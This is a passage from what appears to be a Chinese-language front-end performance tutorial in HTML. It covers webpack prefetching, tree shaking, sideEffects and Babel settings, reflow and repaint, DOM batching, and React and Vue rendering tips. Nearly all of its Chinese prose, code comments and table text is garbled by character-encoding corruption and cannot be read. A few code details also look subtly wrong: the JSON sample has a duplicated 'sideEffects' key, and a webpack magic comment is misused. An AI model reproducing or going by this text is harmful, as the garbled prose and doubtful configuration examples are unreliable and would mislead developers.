&quot;chart&quot;, webpackPrefetch: true */</span> <span class="hljs-string">&#x27;./Chart&#x27;</span>);<br><br><span class="hljs-comment">// é«˜ä¼˜å…ˆçº§é¢„åŠ è½½</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;auth&quot;, webpackPreload: true */</span> <span class="hljs-string">&#x27;./Auth&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="Tree-Shaking-ES-Module-é™æ€åˆ†æ"><a href="#Tree-Shaking-ES-Module-é™æ€åˆ†æ" class="headerlink" title="Tree Shaking (ES Module é™æ€åˆ†æ)"></a>Tree Shaking (ES Module é™æ€åˆ†æ)</h3><p><strong>Tree Shaking æ ¸å¿ƒæœºåˆ¶</strong></p><p>å·¥ä½œåŸç†ï¼š</p><pre class="mermaid">graph LR    A[æºä»£ç ] --> B{ES Module é™æ€åˆ†æ}    B --> C[è¯†åˆ«å¯¼å‡º/å¯¼å…¥å…³ç³»]    C --> D[æ„å»ºä¾èµ–å›¾]    D --> E[æ ‡è®°æœªä½¿ç”¨ä»£ç ]    E --> F[ç§»é™¤â€œæ­»ä»£ç â€]</pre><ul><li>é™æ€åˆ†æåŸºç¡€ï¼šES Module çš„ import&#x2F;export å¿…é¡»åœ¨é¡¶å±‚å£°æ˜ï¼ˆéåŠ¨æ€ï¼‰</li><li>å‰¯ä½œç”¨æ£€æµ‹ï¼šè¯†åˆ«å¯èƒ½å½±å“å…¨å±€çŠ¶æ€çš„ä»£ç ï¼ˆå¦‚ polyfillï¼‰</li><li>å®‰å…¨åˆ é™¤ï¼šä»…ç§»é™¤ç¡®å®šæœªä½¿ç”¨çš„çº¯å‡½æ•°ä»£ç </li></ul><p>ä¸ä¼ ç»Ÿæ‰“åŒ…å¯¹æ¯”ï¼š</p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">æ™®é€šæ‰“åŒ…</th><th align="left">Tree Shaking</th></tr></thead><tbody><tr><td align="left">ä»£ç åŒ…å«</td><td align="left">å…¨éƒ¨æ¨¡å—</td><td align="left">ä»…å®é™…ä½¿ç”¨çš„å¯¼å‡º</td></tr><tr><td align="left">ä¾èµ–åˆ†æ</td><td align="left">æ–‡ä»¶çº§</td><td align="left">å‡½æ•°&#x2F;å˜é‡çº§</td></tr><tr><td align="left">é€‚ç”¨æ¨¡å—</td><td align="left">CommonJS&#x2F;AMD</td><td align="left">ES Module</td></tr><tr><td align="left">è¾“å‡ºå¤§å°</td><td align="left">è¾ƒå¤§</td><td align="left">æ˜¾è‘—å‡å°</td></tr></tbody></table><p><strong>ES Module é™æ€ç‰¹æ€§</strong></p><p>(1) å¯æ‘‡æ ‘ä¼˜åŒ–çš„ä»£ç ç‰¹å¾</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¯å®‰å…¨ç§»é™¤ï¼ˆæœªä½¿ç”¨å¯¼å‡ºï¼‰</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">util1</span> = (<span class="hljs-params"></span>) =&gt; &#123;...&#125;  <span class="hljs-comment">// âŒ å°†è¢«ç§»é™¤</span><br><br><span class="hljs-comment">// è¢«ä½¿ç”¨çš„å¯¼å‡º</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">util2</span> = (<span class="hljs-params"></span>) =&gt; &#123;...&#125;  <span class="hljs-comment">// âœ… ä¿ç•™</span><br><br><span class="hljs-comment">// å‰¯ä½œç”¨ä»£ç ï¼ˆéœ€ç‰¹æ®Šæ ‡è®°ï¼‰</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">initSDK</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">_track</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment">// æœ‰å…¨å±€å‰¯ä½œç”¨ï¼</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(2) ä¸å¯æ‘‡æ ‘çš„æƒ…å†µ</p><table><thead><tr><th align="left">ä»£ç æ¨¡å¼</th><th align="left">åŸå› </th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">åŠ¨æ€å¯¼å…¥import()</td><td align="left">è¿è¡Œæ—¶ä¾èµ–åˆ†æ</td><td align="left">é…ç½®sideEffects: false</td></tr><tr><td align="left">CommonJS æ¨¡å—</td><td align="left">åŠ¨æ€å¯¼å‡ºç»“æ„</td><td align="left">è½¬æ¢ä¸ºES Module</td></tr><tr><td align="left">åŸå‹æ–¹æ³•æ‰©å±•</td><td align="left">éšå¼å‰¯ä½œç”¨</td><td align="left">é¿å…ä¿®æ”¹å†…ç½®åŸå‹</td></tr></tbody></table><p><strong>Webpack å®ç°è¯¦è§£</strong></p><p>(1) åŸºç¡€é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;production&#x27;</span>, <span class="hljs-comment">// å¿…é¡»ç”Ÿäº§æ¨¡å¼</span><br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">usedExports</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// å¯ç”¨æ ‡è®°</span><br>    <span class="hljs-attr">minimize</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// å¯ç”¨ä»£ç å‹ç¼©</span><br>    <span class="hljs-attr">sideEffects</span>: <span class="hljs-literal">true</span>   <span class="hljs-comment">// å¼€å¯å‰¯ä½œç”¨åˆ†æ</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) package.json å…³é”®å£°æ˜</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-library&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// å£°æ˜æ— å‰¯ä½œç”¨</span><br>  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>       <span class="hljs-comment">// æˆ–å£°æ˜æœ‰å‰¯ä½œç”¨çš„æ–‡ä»¶</span><br>    <span class="hljs-string">&quot;**/*.css&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;src/polyfill.js&quot;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>ä¼˜åŒ–å®è·µ</strong></p><p>(1) åº“å¼€å‘è§„èŒƒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ­£ç¡®ï¼šç‹¬ç«‹å¯¼å‡ºå‡½æ•°</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b &#125;<br><br><span class="hljs-comment">// é”™è¯¯ï¼šèšåˆå¯¼å‡ºå¯¹è±¡ï¼ˆéš¾ä¼˜åŒ–ï¼‰</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; ... &#125;,<br>  <span class="hljs-title function_">subtract</span>(<span class="hljs-params">a, b</span>) &#123; ... &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) Babel é…ç½®</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-comment">// .babelrc</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;presets&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;@babel/preset-env&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;modules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// ä¿ç•™ES Module</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>(3) å‰¯ä½œç”¨æ˜¾å¼æ ‡è®°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">/*#__PURE__*/</span> <br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">calculate</span>(); <span class="hljs-comment">// æç¤ºå¯å®‰å…¨ç§»é™¤</span><br><br><span class="hljs-comment">// æˆ–ä½¿ç”¨Webpacké­”æ³•æ³¨é‡Š</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">init</span> = (<span class="hljs-params"></span>) =&gt; &#123; ... &#125; <span class="hljs-comment">/* webpackExports: [&quot;init&quot;] */</span><br></code></pre></td></tr></table></figure><p><strong>Tree Shaking ä¸‰é˜¶æ®µæµç¨‹</strong></p><pre class="mermaid">sequenceDiagram    participant W as Webpack    participant T as Terser    W->>W: 1. æ ‡è®°é˜¶æ®µ<br>ï¼ˆusedExports: trueï¼‰    Note right of W: ç”Ÿæˆæœªä½¿ç”¨ä»£ç åˆ—è¡¨<br>ä½†ä¸å®é™…åˆ é™¤    W->>T: 2. ä¼ é€’ä¼˜åŒ–æ ‡è®°    T->>T: 3. å‹ç¼©é˜¶æ®µå®é™…ç§»é™¤<br>ï¼ˆdead_code eliminationï¼‰    T-->>W: è¿”å›ç²¾ç®€åçš„bundle</pre><h1 id="ä¸‰ã€æ¸²æŸ“æ€§èƒ½ä¼˜åŒ–"><a href="#ä¸‰ã€æ¸²æŸ“æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="ä¸‰ã€æ¸²æŸ“æ€§èƒ½ä¼˜åŒ–"></a>ä¸‰ã€æ¸²æŸ“æ€§èƒ½ä¼˜åŒ–</h1><h2 id="3-1-DOM-æ“ä½œä¼˜åŒ–"><a href="#3-1-DOM-æ“ä½œä¼˜åŒ–" class="headerlink" title="3.1 DOM æ“ä½œä¼˜åŒ–"></a>3.1 DOM æ“ä½œä¼˜åŒ–</h2><h3 id="é¿å…é‡æ’ï¼ˆReflowï¼‰ä¸é‡ç»˜ï¼ˆRepaintï¼‰"><a href="#é¿å…é‡æ’ï¼ˆReflowï¼‰ä¸é‡ç»˜ï¼ˆRepaintï¼‰" class="headerlink" title="é¿å…é‡æ’ï¼ˆReflowï¼‰ä¸é‡ç»˜ï¼ˆRepaintï¼‰"></a>é¿å…é‡æ’ï¼ˆReflowï¼‰ä¸é‡ç»˜ï¼ˆRepaintï¼‰</h3><p><strong>æµè§ˆå™¨æ¸²æŸ“ç®¡çº¿æ ¸å¿ƒæµç¨‹</strong></p><pre class="mermaid">sequenceDiagram    JavaScript->>æ ·å¼è®¡ç®—: ä¿®æ”¹DOM/CSS    æ ·å¼è®¡ç®—->>å¸ƒå±€: è®¡ç®—æ ·å¼    å¸ƒå±€->>é‡æ’: è®¡ç®—å‡ ä½•å±æ€§    é‡æ’->>é‡ç»˜: ç”Ÿæˆç»˜åˆ¶æŒ‡ä»¤    é‡ç»˜->>åˆæˆ: æ …æ ¼åŒ–å¤„ç†    åˆæˆ->>æ˜¾ç¤º: è¾“å‡ºåˆ°å±å¹•</pre><ul><li>é‡æ’ï¼ˆReflowï¼‰ï¼šé‡æ–°è®¡ç®—å…ƒç´ å‡ ä½•å±æ€§ï¼ˆä½ç½®&#x2F;å°ºå¯¸ï¼‰</li><li>é‡ç»˜ï¼ˆRepaintï¼‰ï¼šé‡æ–°ç»˜åˆ¶å…ƒç´ å¤–è§‚ï¼ˆé¢œè‰²&#x2F;èƒŒæ™¯ç­‰ï¼‰</li><li>å…³é”®ç»“è®ºï¼šé‡æ’å¿…å¯¼è‡´é‡ç»˜ï¼Œé‡ç»˜ä¸ä¸€å®šè§¦å‘é‡æ’</li></ul><p><strong>è§¦å‘é‡æ’çš„æ“ä½œæ¸…å•</strong></p><table><thead><tr><th align="left">æ“ä½œç±»å‹</th><th align="left">å…·ä½“ç¤ºä¾‹</th><th align="left">å½±å“èŒƒå›´</th></tr></thead><tbody><tr><td align="left">å°ºå¯¸å˜åŒ–</td><td align="left">elem.style.width &#x3D; â€˜500pxâ€™</td><td align="left">è‡ªèº«åŠå­å…ƒç´ </td></tr><tr><td align="left">ä½ç½®å˜åŒ–</td><td align="left">elem.style.marginTop &#x3D; â€˜20pxâ€™</td><td align="left">åç»­å…„å¼Ÿå…ƒç´ </td></tr><tr><td align="left">å†…å®¹å˜åŒ–</td><td align="left">elem.textContent &#x3D; â€˜newâ€™</td><td align="left">æ•´ä¸ªæ–‡æ¡£æµ</td></tr><tr><td align="left">æ·»åŠ &#x2F;åˆ é™¤DOM</td><td align="left">parent.appendChild(newElem)</td><td align="left">çˆ¶å…ƒç´ åŠåç»­å…ƒç´ </td></tr><tr><td align="left">è·å–å¸ƒå±€ä¿¡æ¯</td><td align="left">elem.offsetHeight</td><td align="left">å¼ºåˆ¶åŒæ­¥é‡æ’</td></tr><tr><td align="left">çª—å£ç¼©æ”¾</td><td align="left">window.resize</td><td align="left">æ•´ä¸ªæ–‡æ¡£</td></tr></tbody></table><p><strong>è§¦å‘é‡ç»˜çš„æ“ä½œæ¸…å•</strong></p><table><thead><tr><th align="left">æ“ä½œç±»å‹</th><th align="left">å…·ä½“ç¤ºä¾‹</th><th align="left">æ€§èƒ½å¼€é”€</th></tr></thead><tbody><tr><td align="left">é¢œè‰²å˜åŒ–</td><td align="left">elem.style.color &#x3D; â€˜redâ€™</td><td align="left">ä½</td></tr><tr><td align="left">èƒŒæ™¯å˜åŒ–</td><td align="left">elem.style.background &#x3D; â€˜blueâ€™</td><td align="left">ä¸­</td></tr><tr><td align="left">é˜´å½±å˜åŒ–</td><td align="left">elem.style.boxShadow &#x3D; â€¦</td><td align="left">ä¸­</td></tr><tr><td align="left">è½®å»“å˜åŒ–</td><td align="left">elem.style.outline &#x3D; â€˜1px solidâ€™</td><td align="left">ä½</td></tr><tr><td align="left">é€æ˜åº¦å˜åŒ–</td><td align="left">elem.style.opacity &#x3D; 0.5</td><td align="left">ä½ï¼ˆè§¦å‘åˆæˆå±‚ï¼‰</td></tr></tbody></table><p><strong>ä¼˜åŒ–ç­–ç•¥ï¼šå‡å°‘é‡æ’</strong></p><p>(1) è¯»å†™åˆ†ç¦»ï¼ˆæ‰¹å¤„ç†DOMæ“ä½œï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯ï¼šäº¤æ›¿è¯»å†™è§¦å‘å¤šæ¬¡é‡æ’</span><br><span class="hljs-keyword">const</span> width = element.<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// è¯»ï¼ˆå¼ºåˆ¶é‡æ’ï¼‰</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = width + <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <span class="hljs-comment">// å†™</span><br><span class="hljs-keyword">const</span> height = element.<span class="hljs-property">offsetHeight</span>; <span class="hljs-comment">// è¯»ï¼ˆå†æ¬¡å¼ºåˆ¶é‡æ’ï¼‰</span><br><br><span class="hljs-comment">// æ­£ç¡®ï¼šå…ˆè¯»åå†™</span><br><span class="hljs-keyword">const</span> width = element.<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// é›†ä¸­è¯»</span><br><span class="hljs-keyword">const</span> height = element.<span class="hljs-property">offsetHeight</span>;<br>element.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = width + <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <span class="hljs-comment">// é›†ä¸­å†™</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = height + <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;px&#x27;</span>;<br></code></pre></td></tr></table></figure><p>(2) è„±ç¦»æ–‡æ¡£æµä¿®æ”¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ–¹æ³•1ï¼šä½¿ç”¨display:none</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br><span class="hljs-comment">// æ‰¹é‡ä¿®æ”¹DOM</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&#x27;block&#x27;</span>;<br><br><span class="hljs-comment">// æ–¹æ³•2ï¼šå…‹éš†ä¿®æ”¹åæ›¿æ¢</span><br><span class="hljs-keyword">const</span> clone = element.<span class="hljs-title function_">cloneNode</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// ä¿®æ”¹å…‹éš†ä½“</span><br>parent.<span class="hljs-title function_">replaceChild</span>(clone, element);<br><br><span class="hljs-comment">// æ–¹æ³•3ï¼šç»å¯¹å®šä½è„±ç¦»æ–‡æ¡£æµ</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">&#x27;absolute&#x27;</span>;<br>element.<span class="hljs-property">style</span>.<span class="hljs-property">left</span> = <span class="hljs-string">&#x27;1000px&#x27;</span>; <span class="hljs-comment">// ç§»å‡ºè§†å£</span><br><span class="hljs-comment">// å®‰å…¨ä¿®æ”¹</span><br></code></pre></td></tr></table></figure><p>(3) ä½¿ç”¨CSS transformæ›¿ä»£ä½ç½®å˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯ï¼šè§¦å‘é‡æ’</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">left</span> = <span class="hljs-string">&#x27;100px&#x27;</span>;<br><br><span class="hljs-comment">// æ­£ç¡®ï¼šä»…è§¦å‘åˆæˆï¼ˆè·³è¿‡é‡æ’é‡ç»˜ï¼‰</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">&#x27;translateX(100px)&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>ä¼˜åŒ–ç­–ç•¥ï¼šå‡å°‘é‡ç»˜</strong></p><p>(1) åˆå¹¶æ ·å¼ä¿®æ”¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯ï¼šå¤šæ¬¡é‡ç»˜</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">&#x27;red&#x27;</span>;<br>element.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&#x27;blue&#x27;</span>;<br><br><span class="hljs-comment">// æ­£ç¡®ï¼šå•æ¬¡é‡ç»˜</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = <span class="hljs-string">&#x27;color:red; background:blue;&#x27;</span>; <br><br><span class="hljs-comment">// æˆ–ä½¿ç”¨class</span><br>element.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;active&#x27;</span>);<br></code></pre></td></tr></table></figure><p>(2) ä½¿ç”¨ GPU åŠ é€Ÿåˆæˆå±‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* åˆ›å»ºç‹¬ç«‹åˆæˆå±‚ */</span><br><span class="hljs-selector-class">.optimized</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform; <span class="hljs-comment">/* æå‰é€šçŸ¥æµè§ˆå™¨ */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* å¼ºåˆ¶æå‡åˆ°åˆæˆå±‚ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) é¿å…é¢‘ç¹ä¿®æ”¹ç›’é˜´å½±</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* é«˜å¼€é”€å±æ€§ */</span><br><span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>);<br><br><span class="hljs-comment">/* ä¼˜åŒ–æ–¹æ¡ˆ */</span><br><span class="hljs-comment">/* æ–¹æ¡ˆ1ï¼šç¼©å°é˜´å½±èŒƒå›´ */</span><br><span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">5px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.3</span>);<br><br><span class="hljs-comment">/* æ–¹æ¡ˆ2ï¼šä½¿ç”¨ä¼ªå…ƒç´ ç‹¬ç«‹å±‚ */</span><br><span class="hljs-selector-class">.element</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>);<br>  <span class="hljs-attribute">z-index</span>: -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¼€å‘è€…è¯Šæ–­å·¥å…·</strong></p><p>Chrome DevTools æ€§èƒ½åˆ†æï¼š</p><ul><li>Performance é¢æ¿ï¼š<ul><li>ç´«è‰²å—ï¼šLayoutï¼ˆé‡æ’ï¼‰</li><li>ç»¿è‰²å—ï¼šPaintï¼ˆé‡ç»˜ï¼‰</li></ul></li><li>æ¸²æŸ“è°ƒè¯•å·¥å…·ï¼š<ul><li>Paint flashingï¼šç»¿è‰²é—ªçƒåŒºåŸŸ &#x3D; é‡ç»˜å‘ç”Ÿä½ç½®</li><li>Layout Shift Regionsï¼šè“è‰²åŒºåŸŸ &#x3D; å¸ƒå±€åç§»</li></ul></li></ul><p><strong>æ¡†æ¶çº§ä¼˜åŒ–</strong></p><p>(1) React é¿å…ç­–ç•¥</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// é”™è¯¯ï¼šå†…è”å¯¹è±¡æ¯æ¬¡æ¸²æŸ“éƒ½æ˜¯æ–°å¼•ç”¨</span><br>&lt;div style=&#123;&#123; <span class="hljs-attr">margin</span>: <span class="hljs-number">10</span> &#125;&#125;&gt;...&lt;/div&gt;<br><br><span class="hljs-comment">// æ­£ç¡®ï¼šæå–å¸¸é‡</span><br><span class="hljs-keyword">const</span> style = &#123; <span class="hljs-attr">margin</span>: <span class="hljs-number">10</span> &#125;;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;style&#125;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br><span class="hljs-comment">// ä½¿ç”¨React.memoé¿å…ä¸å¿…è¦æ¸²æŸ“</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MemoComp</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">() =&gt;</span> &#123;...&#125;);<br></code></pre></td></tr></table></figure><p>(2) Vue ä¼˜åŒ–æ–¹æ¡ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;template&gt;<br>  &lt;!-- é”™è¯¯ï¼šv-ifé¢‘ç¹åˆ‡æ¢è§¦å‘é‡æ’ --&gt;<br>  &lt;div v-if=&quot;show&quot;&gt;å†…å®¹A&lt;/div&gt;<br>  &lt;div v-else&gt;å†…å®¹B&lt;/div&gt;<br>  <br>  &lt;!-- æ­£ç¡®ï¼šv-showä»…è§¦å‘é‡ç»˜ --&gt;<br>  &lt;div v-show=&quot;show&quot;&gt;å†…å®¹A&lt;/div&gt;<br>  &lt;div v-show=&quot;!show&quot;&gt;å†…å®¹B&lt;/div&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure><h3 id="æ‰¹é‡DOMæ›´æ–°ï¼šDocumentFragment-Virtual-DOM"><a href="#æ‰¹é‡DOMæ›´æ–°ï¼šDocumentFragment-Virtual-DOM" class="headerlink" title="æ‰¹é‡DOMæ›´æ–°ï¼šDocumentFragment &#x2F; Virtual DOM"></a>æ‰¹é‡DOMæ›´æ–°ï¼šDocumentFragment &#x2F; Virtual DOM</h3><p><strong>æ‰¹é‡æ›´æ–°çš„æ ¸å¿ƒä»·å€¼</strong></p><ul><li>å‡å°‘é‡æ’æ¬¡æ•°ï¼šå°†å¤šæ¬¡DOMæ“ä½œåˆå¹¶ä¸ºå•æ¬¡</li><li>æ€§èƒ½æå‡ï¼šé¿å…é¢‘ç¹å¸ƒå±€è®¡ç®—å’Œæ¸²æŸ“</li><li>åº”ç”¨åœºæ™¯ï¼šåŠ¨æ€åˆ—è¡¨æ¸²æŸ“ã€å¤§è§„æ¨¡UIæ›´æ–°</li></ul><p><strong>DocumentFragmentï¼šåŸç”Ÿæ‰¹é‡æ›´æ–°</strong></p><p>æ ¸å¿ƒæœºåˆ¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºæ–‡æ¡£ç‰‡æ®µï¼ˆå†…å­˜DOMå®¹å™¨ï¼‰</span><br><span 